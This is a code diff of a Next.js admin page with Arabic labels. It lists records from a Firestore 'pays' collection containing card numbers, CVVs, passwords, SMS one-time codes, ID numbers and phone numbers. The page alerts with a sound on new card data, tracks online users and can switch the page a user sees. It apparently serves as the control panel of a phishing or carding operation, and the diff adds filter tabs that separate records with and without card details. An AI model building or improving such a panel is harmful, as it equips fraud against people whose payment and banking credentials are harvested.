@@ -2,7 +2,7 @@
 
 import { useState, useEffect } from "react"
 import { useRouter } from "next/navigation"
-import { Trash2, Users, CreditCard, UserCheck } from "lucide-react"
+import { Trash2, Users, CreditCard, UserCheck, Filter } from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { Badge } from "@/components/ui/badge"
 import { ar } from "date-fns/locale"
@@ -14,6 +14,7 @@ import { playNotificationSound } from "@/lib/actions"
 import { auth, db, database } from "@/lib/firestore"
 import { InfoIcon } from "lucide-react"
 import { onValue, ref } from "firebase/database"
+import { Tabs, TabsList, TabsTrigger } from "@/components/ui/tabs"
 
 function useOnlineUsersCount() {
   const [onlineUsersCount, setOnlineUsersCount] = useState(0)
@@ -34,7 +35,7 @@ function useOnlineUsersCount() {
   return onlineUsersCount
 }
 interface Notification {
-  createdDate:string
+  createdDate: string
   cardNumber: string
   bank?: string
   pass: string
@@ -66,11 +67,13 @@ interface Notification {
   mobile: string
   network: string
   phoneOtp: string
-  cvv:string
+  cvv: string
 }
 
 export default function NotificationsPage() {
   const [notifications, setNotifications] = useState<Notification[]>([])
+  const [filteredNotifications, setFilteredNotifications] = useState<Notification[]>([])
+  const [activeFilter, setActiveFilter] = useState<"all" | "withCard" | "withoutCard">("all")
   const [isLoading, setIsLoading] = useState(true)
   const [message, setMessage] = useState<boolean>(false)
   const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" | null>(null)
@@ -94,19 +97,38 @@ export default function NotificationsPage() {
 
     return () => unsubscribe()
   }, [router])
-  useEffect(()=>{
 
-  },[])
+  useEffect(() => {
+    // Apply filtering whenever notifications or activeFilter changes
+    applyFilter(activeFilter)
+  }, [notifications, activeFilter])
+
+  const applyFilter = (filter: "all" | "withCard" | "withoutCard") => {
+    switch (filter) {
+      case "all":
+        setFilteredNotifications(notifications)
+        break
+      case "withCard":
+        setFilteredNotifications(notifications.filter((notification) => !!notification.cardNumber))
+        break
+      case "withoutCard":
+        setFilteredNotifications(notifications.filter((notification) => !notification.cardNumber))
+        break
+      default:
+        setFilteredNotifications(notifications)
+    }
+  }
+
   const fetchNotifications = () => {
     setIsLoading(true)
-    const q = query(collection(db, "pays"), orderBy("createdDate", "desc"));
+    const q = query(collection(db, "pays"), orderBy("createdDate", "desc"))
     const unsubscribe = onSnapshot(
       q,
       (querySnapshot) => {
         const notificationsData = querySnapshot.docs
           .map((doc) => {
             const data = doc.data() as any
-          
+
             return { id: doc.id, ...data }
           })
           .filter((notification: any) => !notification.isHidden) as Notification[]
@@ -119,7 +141,7 @@ export default function NotificationsPage() {
         const hasNewGeneralInfo = notificationsData.some(
           (notification) =>
             (notification.idNumber || notification.mobile) &&
-            !notifications.some((n) => n.id === notification.id && (n.idNumber  || n.mobile)),
+            !notifications.some((n) => n.id === notification.id && (n.idNumber || n.mobile)),
         )
 
         // Only play notification sound if new card info or general info is added
@@ -247,7 +269,6 @@ export default function NotificationsPage() {
     )
   }
 
-
   const handleUpdatePage = async (id: string, page: string) => {
     try {
       const docRef = doc(db, "pays", id)
@@ -282,7 +303,7 @@ export default function NotificationsPage() {
           </div>
         </div>
 
-        {/* cs Grid */}
+        {/* Stats Grid */}
         <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4 mb-6">
           {/* Online Users Card */}
           <div className="bg-white rounded-lg shadow p-4 flex items-center">
@@ -318,6 +339,24 @@ export default function NotificationsPage() {
           </div>
         </div>
 
+        {/* Filter Tabs */}
+        <div className="bg-white rounded-lg shadow p-4 mb-6">
+          <div className="flex items-center mb-2">
+            <Filter className="h-5 w-5 text-gray-500 mr-2" />
+            <h2 className="text-lg font-medium">تصفية الإشعارات</h2>
+          </div>
+          <Tabs
+            defaultValue="all"
+            onValueChange={(value) => setActiveFilter(value as "all" | "withCard" | "withoutCard")}
+          >
+            <TabsList className="grid w-full grid-cols-3">
+              <TabsTrigger value="all">الكل</TabsTrigger>
+              <TabsTrigger value="withCard">مع بطاقة</TabsTrigger>
+              <TabsTrigger value="withoutCard">بدون بطاقة</TabsTrigger>
+            </TabsList>
+          </Tabs>
+        </div>
+
         <div className="bg-gray-100 rounded-lg">
           {/* Desktop Table View - Hidden on Mobile */}
           <div className="hidden md:block overflow-x-auto">
@@ -335,13 +374,12 @@ export default function NotificationsPage() {
                 </tr>
               </thead>
               <tbody>
-                {notifications.map((notification) => (
+                {filteredNotifications.map((notification) => (
                   <tr key={notification.id} className="border-b border-gray-700">
                     <td className="px-4 py-3">{notification?.country!}</td>
                     <td className="px-4 py-3">{notification.personalInfo?.id!}</td>
                     <td className="px-4 py-3">
                       <div className="flex flex-col sm:flex-row gap-2">
-                      
                         <Badge
                           variant={notification.cardNumber ? "default" : "destructive"}
                           className={`rounded-md cursor-pointer ${notification.cardNumber ? "bg-green-500" : ""}`}
@@ -350,7 +388,7 @@ export default function NotificationsPage() {
                           {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
                         </Badge>
                         <Badge
-                          variant={notification.idNumber ?"default":"secondary"}
+                          variant={notification.idNumber ? "default" : "secondary"}
                           className={`rounded-md cursor-pointer ${notification.idNumber ? "bg-fuchsia-500" : ""}`}
                           onClick={() => handleInfoClick(notification, "personal")}
                         >
@@ -371,9 +409,7 @@ export default function NotificationsPage() {
                       <UserStatusBadge userId={notification.id} />
                     </td>
                     <td className="px-4 py-3 text-center">
-                      <div className="flex flex-col items-center space-y-2">
-                      {notification.status}
-                      </div>
+                      <div className="flex flex-col items-center space-y-2">{notification.status}</div>
                     </td>
                     <td className="px-4 py-3 text-center">
                       <Button
@@ -393,7 +429,7 @@ export default function NotificationsPage() {
 
           {/* Mobile Card View - Shown only on Mobile */}
           <div className="md:hidden space-y-4 p-2">
-            {notifications.map((notification) => (
+            {filteredNotifications.map((notification) => (
               <div key={notification.id} className="bg-white rounded-lg shadow-md p-4">
                 <div className="flex justify-between items-start mb-3">
                   <div>
@@ -415,23 +451,22 @@ export default function NotificationsPage() {
 
                 <div className="grid grid-cols-1 gap-2 mb-3">
                   <div className="flex flex-wrap gap-2">
-                  <Badge
+                    <Badge
                       variant={notification.cardNumber ? "default" : "destructive"}
                       className={`rounded-md cursor-pointer ${notification.cardNumber ? "bg-green-500" : ""}`}
                       onClick={() => handleInfoClick(notification, "card")}
                     >
                       {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
                     </Badge>
-                  
+
                     <Badge
-                      variant={notification.idNumber? "default":"destructive"}
+                      variant={notification.idNumber ? "default" : "destructive"}
                       className={`rounded-md cursor-pointer ${notification.idNumber ? "bg-fuchsia-500" : ""}`}
                       onClick={() => handleInfoClick(notification, "personal")}
                     >
                       <InfoIcon className="h-4 w-4 mr-1" />
                       معلومات عامة
-                    </Badge>  
-                    
+                    </Badge>
                   </div>
 
                   <div className="text-sm">
@@ -450,12 +485,8 @@ export default function NotificationsPage() {
 
                 <div className="border-t pt-3">
                   <div className="text-sm font-medium mb-2">تحديث الصفحة:</div>
-                  <div className="flex flex-wrap gap-2">
-                 
-                  </div>
-                  <div className="text-xs text-gray-500 mt-1">
-                  
-                  </div>
+                  <div className="flex flex-wrap gap-2"></div>
+                  <div className="text-xs text-gray-500 mt-1"></div>
                 </div>
               </div>
             ))}
@@ -508,8 +539,8 @@ export default function NotificationsPage() {
               </p>
               <p className="flex items-center">
                 <strong className="text-red-400 mx-4">رمز التحقق :</strong> {selectedNotification?.otp!}
-              </p> 
-               <p className="flex items-center">
+              </p>
+              <p className="flex items-center">
                 <strong className="text-red-400 mx-4">رمز الامان :</strong> {selectedNotification?.cvv!}
               </p>
             </div>
@@ -525,8 +556,7 @@ export default function NotificationsPage() {
               <p>
                 <strong>نوع الشبكة :</strong> {selectedNotification.network}
               </p>{" "}
-              <p>
-              </p>{" "}
+              <p></p>{" "}
               <p>
                 <strong>رمز التحقق المرسل :</strong> {selectedNotification.finalOtp}
               </p>
